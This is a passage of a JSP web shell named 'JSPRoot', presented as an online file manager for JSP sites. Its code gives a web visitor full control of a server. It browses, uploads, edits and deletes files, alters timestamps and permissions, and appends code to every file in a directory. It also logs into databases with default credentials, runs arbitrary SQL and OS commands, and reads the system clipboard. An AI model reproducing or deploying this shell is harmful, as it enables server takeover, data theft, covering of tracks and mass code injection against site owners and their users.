			StringBuffer sb = new StringBuffer();
			sb.append("目录压缩完毕，但压缩中出现异常，以下为异常信息(异常信息一般可忽略不计，由于操作冲突问题，可能会报异常)：");
			for(int i=0;i<error.size();i++){
				sb.append(error.get(i)+"\n");
			}
			fm.editFile(currentPath+var[2]+".log",sb.toString());
		}
		request.setAttribute("info","目录压缩完毕，请查看日志"+var[2]+".log");
		type = null;
	}else if("multiAppendCode".equals(type)){//对当前目录下的所有文件执行批量增加
		String[] var = value.split("\\|");
		currentPath = var[0];
		String isSuccess = fm.multiAppendCode(currentPath,var[1],otherValue);
		request.setAttribute("info","true".equals(isSuccess)?"代码批量增加成功":isSuccess);
		type = null;
	}else if("time".equals(type)){//修改文件时间
		String[] var = value.split("\\|");
		currentPath = var[0];
		boolean isSuccess = fm.setFileLastTime(var[0],var[1],var[2]);
		request.setAttribute("info",isSuccess?"时间修改成功":"时间修改失败，请检查是否有权限或者时间格式输入是否正确");
		type = null;
	}else if("filestatus".equals(type)){//修改文件权限
		String[] var = value.split("\\|");
		currentPath = var[0];
		boolean isSuccess = fm.setFileStatus(var[0],var[1],var[2],new Boolean(var[3]));
		request.setAttribute("info",isSuccess?"文件权限修改成功":"文件权限修改失败，请检查是否有相关权限");
		type = null;
	}
	//判断是否上传文件
	if(contentType != null&& contentType.indexOf("multipart/form-data") != -1){
		String result = fm.upload(request);//上传文件，如果返回内容为false，则上传失败
		if("false".equals(result)){
			request.setAttribute("info","文件上传失败，当前目录路径丢失，跳回WebRoot目录");
		}else{
			value = result;
			request.setAttribute("info","文件上传成功");
		}
	}
	//判断类型，如果为列出文件
	if(null==type||"".equals(type.trim())||"list".equals(type)){
		if(null==currentPath){
			currentPath = value;//设置当前路径为提交的value的值
		}
		List<FileBean> driver = fm.listDriver();//获取当前系统所有驱动器
		//显示文件列表,判断有无传递路径，如果无，则默认显示当前路径
		if(null==currentPath||"".equals(currentPath)){
			currentPath = webRootPath;
		}
		currentPath = fm.checkPath(currentPath);
		String parentPath = fm.getParentPath(currentPath);//获取上级路径
		//列出文件
		fileList = fm.listFile(currentPath);
%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr><%float total = fm.getCurrentPathTotalSize(currentPath); float free = fm.getCurrentPathFreeSize(currentPath); %>
    <td><h2>File Manager - Current disk free <%=free %> G of <%=total %> G (<%=Utils.getRate(total,free) %>)</h2>
      <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
        <tr>
          <td nowrap>Current Directory</td>
          <td width="100%"><input class="input" name="dir" id="dir" value="<%=currentPath %>" type="text" style="width:100%;margin:0 8px;"></td>
          <td nowrap><input class="bt" value="GO" type="button" onClick="javascript:goPath($('dir').value);"></td>
        </tr>
      </table>
      <table width="100%" border="0" cellpadding="4" cellspacing="0">
        <tr class="alt1">
          <td colspan="7" style="padding:5px;"><div style="float:right;">
          	<form method="post" action="" name="upFile" enctype="multipart/form-data">
          	  <input type="hidden" name="action" value="file"/>
          	  <input type="hidden" name="currentPath" value="<%=currentPath %>"/>
              <input class="input" name="v" value="" type="file" />
              <input class="bt" name="doupfile" value="Upload" type="submit" />
            </form>
            </div>
            <a href="javascript:goaction('file','list','<%=webRootPath %>');">WebRoot</a> | <a href="javascript:createdir('<%=currentPath %>');">Create Directory</a> | <a href="javascript:createfile('<%=currentPath %>');">Create File</a> | <a href="javascript:setMulti('<%=currentPath %>');">MultiAppendCode</a> |
            <%for(int i=0;i<driver.size();i++){ %>
            <a href="javascript:goaction('file','list','<%=driver.get(i).getFileName() %>');" title="Driver(<%=driver.get(i).getFileName() %>)<%='\n' %>Total Size:<%=driver.get(i).getTotalSize() %>G<%='\n' %>Free Size:<%=driver.get(i).getFreeSize() %>G">Driver(<%=driver.get(i).getFileName() %>)</a> |
            <%} %>
          </td>
        </tr>
        <tr class="head">
          <td>&nbsp;</td>
          <td>Filename</td>
          <td width="16%">Last modified</td>
          <td width="10%">Size</td>
          <td width="20%">Chmod(Read/Write/Exec)</td>
          <td width="22%">Action</td>
        </tr>
        <tr class=alt1>
          <td align="center"><font face="Wingdings 3" size=4>=</font></td>
          <td nowrap colspan="5"><a href="javascript:goaction('file','list','<%=parentPath %>');">Parent Directory</a></td>
        </tr>
        <tr bgcolor="#dddddd" style="border-top:1px solid #fff;border-bottom:1px solid #ddd;">
          <td colspan="6" height="5"></td>
        </tr>
        <%for(int i=0;i<fileList.size();i++){ %>
        <%if(fileList.get(i).isFolder){ %>
        <tr class="alt<%=(i%2==0)?"1":"2" %>" onMouseOver="this.className='focus';" onMouseOut="this.className='alt<%=(i%2==0)?"1":"2" %>';">
          <td width="2%" noWrap><font face="wingdings" size="3">0</font></td>
          <td><a href="javascript:goaction('file','list','<%=currentPath+fileList.get(i).getFileName() %>');"><%=fileList.get(i).getFileName() %></a></td>
          <td noWrap><%=fileList.get(i).getLastModifDate() %></td>
          <td noWrap><%=fileList.get(i).isFolder()?"--":fileList.get(i).getFileSize() %></td>
          <td noWrap><a href="javascript:filestatus('<%=currentPath %>','<%=fileList.get(i).getFileName() %>','r','<%=!fileList.get(i).isCanRead() %>');"><%=fileList.get(i).isCanRead()?"True":"False" %></a> / <a href="javascript:filestatus('<%=currentPath %>','<%=fileList.get(i).getFileName() %>','w','<%=!fileList.get(i).isCanWriter() %>');"><%=fileList.get(i).isCanWriter()?"True":"False" %></a> / <a href="javascript:filestatus('<%=currentPath %>','<%=fileList.get(i).getFileName() %>','e','<%=!fileList.get(i).isCanExecute() %>');"><%=fileList.get(i).isCanExecute()?"True":"False" %></a></td>
          <td noWrap><a href="javascript:zipfile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Zip</a> | <a href="javascript:delfile('deletedir','<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Del</a> | <a href="javascript:renamefile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Rename</a>  | <a href="javascript:timefile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Time</a></td>
        </tr>
        <%if(fileList.size()!=(i+1)&&!fileList.get(i+1).isFolder){//此处需要判断是否输出文件夹与文件之间的分隔符%>
        <tr bgcolor="#dddddd" style="border-top:1px solid #fff;border-bottom:1px solid #ddd;">
          <td colspan="6" height="5"></td>
        </tr>
        <%}}else{%>
        <tr class="alt<%=(i%2==0)?"1":"2" %>" onMouseOver="this.className='focus';" onMouseOut="this.className='alt<%=(i%2==0)?"1":"2" %>';">
          <td width="2%" noWrap><font face="wingdings" size="3">2</font></td>
          <td><a href="javascript:openfile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');"><%=fileList.get(i).getFileName() %></a></td>
          <td noWrap><%=fileList.get(i).getLastModifDate() %></td>
          <td noWrap><%=fileList.get(i).isFolder()?"--":fileList.get(i).getFileSize() %></td>
          <td noWrap><a href="javascript:filestatus('<%=currentPath %>','<%=fileList.get(i).getFileName() %>','r','<%=!fileList.get(i).isCanRead() %>');"><%=fileList.get(i).isCanRead()?"True":"False" %></a> / <a href="javascript:filestatus('<%=currentPath %>','<%=fileList.get(i).getFileName() %>','w','<%=!fileList.get(i).isCanWriter() %>');"><%=fileList.get(i).isCanWriter()?"True":"False" %></a> / <a href="javascript:filestatus('<%=currentPath %>','<%=fileList.get(i).getFileName() %>','e','<%=!fileList.get(i).isCanExecute() %>');"><%=fileList.get(i).isCanExecute()?"True":"False" %></a></td>
          <td noWrap><a href="javascript:downfile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Down</a> | <a href="javascript:copyfile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Copy</a> | <a href="javascript:openfile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Edit</a> | <a href="javascript:delfile('deletefile','<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Del</a> | <a href="javascript:renamefile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Rename</a> | <a href="javascript:timefile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');">Time</a></td>
        </tr>
        <%} %>
        <%} %>
        <tr class="alt2">
          <td colspan="10" align="left">Total <%=fileList.size() %> directories Or files</td>
        </tr>
      </table></td>
  </tr>
</table>
<% 
	}else if("open".equals(type)){
		String[] var = value.split("\\|");
		String content = fm.openFile(var[0],var[1]);
%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr>
    <td><h2>Edit File &raquo;</h2>
      <p>Current File (import new file name and new file)<br />
        <input class="input" name="editfilename" id="editfilename" value="<%=var[0]+var[1] %>" type="text" size="100"  />
      </p>
      <p>File Content<br />
        <textarea class="area" id="filecontent" name="filecontent" cols="100" rows="25" ><%=content %></textarea>
      </p>
      <p>
        <input class="bt" type="button" value="Submit" onClick="javascript:editfile('<%=var[0] %>','<%=var[1] %>');">
        <input class="bt" type="button" value="Return" onClick="javascript:goPath('<%=var[0] %>');">
      </p></td>
  </tr>
</table>
<%}}else if("javav".equals(act)){%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr>
    <td><h2>Server &raquo;</h2>
      <ul class="info">
        <li><u>JVM版本号:</u><%=prop.getProperty("java.vm.version")%></li>
        <li><u>JAVA安装目录:</u><%=prop.getProperty("java.home")%></li>
        <li><u>JAVA类路径:</u><%=prop.getProperty("java.class.path")%></li>
        <li><u>用户所属国家:</u><%=prop.getProperty("user.country")%></li>
        <li><u>操作系统:</u><%=prop.getProperty("os.name")%></li>
        <li><u>字符集:</u><%=prop.getProperty("sun.jnu.encoding")%></li>
        <li><u>当前文件绝对路径:</u><%=request.getRequestURL().toString() %></li>
        <li><u>当前文件URL路径:</u><%=request.getRequestURI() %></li>
        <li><u>用户当前工作目录:</u><%=prop.getProperty("user.dir")%></li>
        <li><u>用户主目录:</u><%=prop.getProperty("user.home")%></li>
        <li><u>用户账户名称:</u><%=prop.getProperty("user.name")%></li>
      </ul>
      <h2>Java &raquo;</h2>
      <%Iterator iter=System.getProperties().keySet().iterator();
      out.println("<ul class=\"info\">");
      while(iter.hasNext()) {
	      try{
	    	  String key=(String)iter.next();
	          out.println("<li><u>"+key+":</u>"+prop.getProperty(key)+"</li>");
	      }catch(Exception ex){
	    	  out.println("<li>对不起，当前属性出错</li>");
	      }
      }
      out.println("</ul>");%> 
      </td>
  </tr>
</table>
<%}else if("about".equals(act)){%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr>
    <td><h2>About &raquo;</h2>
      <blockquote>JSPRoot，一个针对jsp网站的在线文件管理工具，可以对文件进行基础的操作，同时还提供有针对不同数据库的连接功能，命令执行功能等。<br/></blockquote></td>
  </tr>
</table>
<%}else if("sqladmin".equals(act)) {//数据库的相关操作
		//首先判断session中是否有conn存在，如果没有则创建
		DatabaseManager dm = new DatabaseManager();
		Connection conn = (Connection)session.getAttribute("conn");
		String dbType = (String)request.getParameter("dbType");
		if("".equals(dbType)){
			//如果类型为空时，搜寻下session中是否已经存入了dbType的值
			dbType = (String)session.getAttribute("dbType");
			dbType = dbType==null?"":dbType;
		}
		String localhost = (String)request.getParameter("localhost");
		String dbName = (String)request.getParameter("dbName");
		String dbUser = (String)request.getParameter("dbUser");
		String dbPass = (String)request.getParameter("dbPass");
		String dbCharset = (String)request.getParameter("dbCharset");
		if(null==conn&&!"".equals(dbType)){
			//默认打开该页面的情况，conn没有创建，也有可能转到其他页面后，又转回其页面
			Object obj  = dm.getConnection(dbType,localhost,dbName,dbUser,dbPass,dbCharset);
			if(obj instanceof Connection){
				conn = (Connection)obj;
			}else{
				request.setAttribute("info","数据库连接失败："+obj.toString());
			}
			session.setAttribute("conn",conn);
			session.setAttribute("dbType",dbType);
		}
		//判断如果类型为disConn，则删除此链接
		if("disConn".equals(type)){
			conn.close();
			conn = null;
			dbType = "";
			session.removeAttribute("conn");
			session.removeAttribute("dbType");
		}
		String connBtn;
		String sqlCommandBtn;
		String disabled;
		if(null==conn){
			connBtn = "<input class=\"bt\" name=\"connect\" value=\"Connect\" type=\"button\" size=\"100\"  onclick=\"javascript:dbConn();\"/>";
			sqlCommandBtn = "<input class=\"bt\" name=\"sqlExcute\" value=\"Excute\" type=\"button\" size=\"100\" disabled />";
			disabled = "";
		}else{
			connBtn = "<input class=\"bt\" name=\"DisConnect\" value=\"DisConnect\" type=\"button\" size=\"100\"  onclick=\"javascript:disConn();\"/>";
			sqlCommandBtn = "<input class=\"bt\" name=\"sqlExcute\" value=\"Excute\" type=\"button\" size=\"100\" onclick=\"javascript:sqlExcute();\" />";
			disabled = "disabled";
		}
		List<String> list = dm.getTables(dbType,conn);
		if(list.size()==1&&list.get(0).startsWith("Error")){
			request.setAttribute("info",list.get(0));
			list.remove(0);
		}
%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr>
    <td colspan="2"><h2>Database Manager &raquo;</h2>
    <p>Please select Database type:
  	  <select name="selectDB" id="selectDB" onChange="checkSelectDBType(this.value);" <%=disabled %>><option value="access">Access</option><option value="mysql">Mysql</option><option value="oracle">Oracle</option><option value="mssql">MSSql</option></select>
  	</p>
    <div id="access" class="dbinput" style="display:block;">ACCESS(mdb) path：<input type="text" value="c:/test.mdb" name="localhost" id="access_localhost" class="input" style="width:400px;"/></div>
    <div id="mysql" class="dbinput">DBHost：<input type="text" value="localhost:3306" name="localhost" id="mysql_localhost" class="input"/> DBUser：<input type="text" value="root" name="dbuser" id="mysql_dbuser" class="input"/> DBPass：<input type="text" value="admin" name="dbpass" id="mysql_dbpass" class="input"/> DBCharset：<select class="input" id="charset" name="charset" ><option value="" selected>Default</option><option value="gbk">GBK</option><option value="big5">Big5</option><option value="utf8">UTF-8</option><option value="latin1">Latin1</option></select></div>
    <div id="oracle" class="dbinput">DBHost：<input type="text" value="127.0.0.1:1521" name="localhost" id="oracle_localhost" class="input"/> SID：<input type="text" value="" name="dbname" id="oracle_dbname" class="input"/> DBUser：<input type="text" value="" name="dbuser" id="oracle_dbuser" class="input"/> DBPass：<input type="text" value="" name="dbpass" id="oracle_dbpass" class="input"/></div>
    <div id="mssql" class="dbinput">DBHost：<input type="text" value="127.0.0.1:1433" name="localhost" id="mssql_localhost" class="input"/> DBUser：<input type="text" value="sa" name="dbuser" id="mssql_dbuser" class="input"/> DBPass：<input type="text" value="" name="dbpass" id="mssql_dbpass" class="input"/></div>
    <div style="float:left;"><%=connBtn %></div>
    <%if(!"".equals(dbType)){%><script>$('selectDB').value='<%=dbType %>';checkSelectDBType('<%=dbType %>');</script><%} %>
    </td>
  </tr>
  <tr>
  	<td colspan="2"><h2>All Table &raquo;</h2></td>
  </tr>
  <tr><td colspan="2"><ul style="margin:0px;padding:0px;">
	<%for(int i=0;i<list.size();i++){ %>
	   <%=list.get(i) %>
	<%} %>
  </ul></td></tr>
  <tr>
  	<td colspan="2"><h2>SQL Command &raquo;</h2></td>
  </tr>
  <tr>
  	<td width="30%"><textarea class="area" id="sqlCommand" name="sqlCommand" cols="90" rows="3"><%=value %></textarea></td>
  	<td align="left"><%=sqlCommandBtn %></td>
  </tr>
<%if("sqlExcute".equals(type)){ 
		Object[] obj = dm.excuteSQL(conn,value);
		List<String[]> metaList = new ArrayList<String[]>();
		List<Object[]> arrayList = new ArrayList<Object[]>();
		//判断是否执行的是update等操作语句
		if(obj[0] instanceof Boolean){
			request.setAttribute("info","语句执行成功");
		}else if(obj[0] instanceof String){
			request.setAttribute("info",obj[0]);
		}else {
			metaList = (List<String[]>)obj[0];
			arrayList = (List<Object[]>)obj[1];
		}
%>
  <tr>
    <td colspan="2"><h2>SQL Result &raquo;</h2></td>
  </tr>
  <tr>
    <td colspan="2">
	<table width="100%" border="0" cellpadding="15" cellspacing="0">
	   <tr class="head"><%for(int i=0;i<metaList.size();i++){  %>
	     <td><%=metaList.get(i)[0] %><br/>(<%=metaList.get(i)[1] %>-<%=metaList.get(i)[2] %>)</td>
	   <%} %></tr>
	<%for(int i=0;i<arrayList.size();i++){Object[] array = arrayList.get(i); %>
	   <tr class="alt<%=(i%2==0)?"1":"2" %>" onMouseOver="this.className='focus';" onMouseOut="this.className='alt<%=(i%2==0)?"1":"2" %>';">
	   <%for(int k=0;k<array.length;k++){ %>
	     <td><%=(null==array[k])?"(NULL)":array[k] %></td>
	   <%} %>
	   </tr>	
	<%} %>
	</table>
    </td>
  </tr>
 <%} %>
</table>
<%}else if("shell".equals(act)){//命令提示符的相关操作%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr>
    <td><h2>Execute Program &raquo;</h2>
      <p>Command<br />
        <input class="input" name="command" id="command" value="<%=value %>" type="text" size="100"  /> <input class="bt" type="button" value="Exec" onClick="javascript:execute();">
      </p>
    </td>
  </tr>
  <tr><td><hr width="100%" noshade /></td></tr>
</table>
<div style="margin:0 15px;"><pre><%=Utils.exec(value,prop) %></pre></div>
<%}else if("clipboard".equals(act)){//查看修改当前系统剪贴板内的内容
	//判断是否修改剪贴板上的内容
	String content = "";
	Clipboard c = Toolkit.getDefaultToolkit().getSystemClipboard();
	if("edit".equals(type)){
		Transferable tf = new StringSelection(value);
		c.setContents(tf, null);
	}
	content = c.isDataFlavorAvailable(DataFlavor.stringFlavor)?(String)c.getData(DataFlavor.stringFlavor):"当前系统剪贴板上的内容不是文本格式！";
%>
<table width="100%" border="0" cellpadding="15" cellspacing="0">
  <tr>
    <td><h2>System Clipboard&raquo;</h2></td>
  </tr>
  <tr>
    <td><pre><%=Utils.conv2Html(content) %></pre></td>
  </tr>
  <tr><td><hr width="100%" noshade /></td></tr>
  <tr>
    <td><textarea id="clipboard" name="clipboard" class="input" style="margin-right:5px;width:500px;height:100px;"></textarea><input class="bt" type="button" value="Update Clipboard" onClick="javascript:clipboard();"></td>
  </tr>
</table>
<%}else if("logout".equals(act)){//退出操作
		session.removeAttribute(sessionName);
		response.sendRedirect(request.getRequestURI().substring(request.getRequestURI().lastIndexOf("/")+1));
}%>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
  <%long endMem = Runtime.getRuntime().freeMemory();long endTime = System.currentTimeMillis();%>
  <span style="float:right;">Processed in <%=endTime-startTime %> Millisecond(m) | Use Memory <%=startMem - endMem %></span><%=Utils.convert() %></div>
<%String info = (String)request.getAttribute("info");if(null!=info&&!"".equals(info)){%>
<div id="infomessage" style="display:none;"><%=info %></div>
<script>document.getElementById("info").style.display="block";document.getElementById("info").innerHTML=$('infomessage').innerHTML;</script>
<%}%>
</body>
</html>